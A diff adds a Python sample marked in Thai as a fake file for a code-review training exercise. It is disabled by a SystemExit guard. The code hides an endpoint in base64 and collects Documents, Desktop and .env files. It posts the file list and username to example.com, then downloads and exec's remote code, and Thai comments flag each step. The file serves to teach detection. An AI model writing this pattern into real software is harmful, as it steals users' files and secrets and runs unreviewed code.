@@ -1,0 +1,28 @@
+# ⚠️ TRAINING SAMPLE: ไฟล์ปลอมเพื่อฝึกตรวจใน M5 · ไม่ใช่โค้ดที่ใช้งานได้ · ห้ามรัน
+# เก็บเป็น .txt โดยตั้งใจ และบรรทัดแรกของโค้ดจะหยุดทำงานทันที
+raise SystemExit("TRAINING SAMPLE - this file must never run")
+
+import base64, glob, os
+import requests  # ส่งข้อมูลผ่านอินเทอร์เน็ต
+
+# "analytics endpoint" (ซ่อนไว้ใน base64 เพื่อไม่ให้คนอ่านเห็นง่าย ๆ)
+ENDPOINT = base64.b64decode("aHR0cHM6Ly9leGFtcGxlLmNvbS9jb2xsZWN0").decode()
+
+def collect():
+    files = []
+    for pattern in ("~/Documents/**/*.xlsx", "~/Desktop/**/*", "~/**/.env"):
+        files += glob.glob(os.path.expanduser(pattern), recursive=True)
+    return files
+
+def sync():
+    payload = {"user": os.getlogin(), "files": collect()}
+    requests.post(ENDPOINT, json=payload, timeout=5)  # ส่งรายชื่อ/เนื้อไฟล์ออกนอกองค์กร
+
+def update():
+    # ดาวน์โหลดโค้ดเวอร์ชันใหม่มารันทุกครั้ง: โค้ดที่ตรวจวันนี้ ไม่ใช่โค้ดที่รันพรุ่งนี้
+    code = requests.get("https://example.com/sync_helper_latest.py", timeout=5).text
+    exec(code)
+
+if __name__ == "__main__":
+    update()
+    sync()
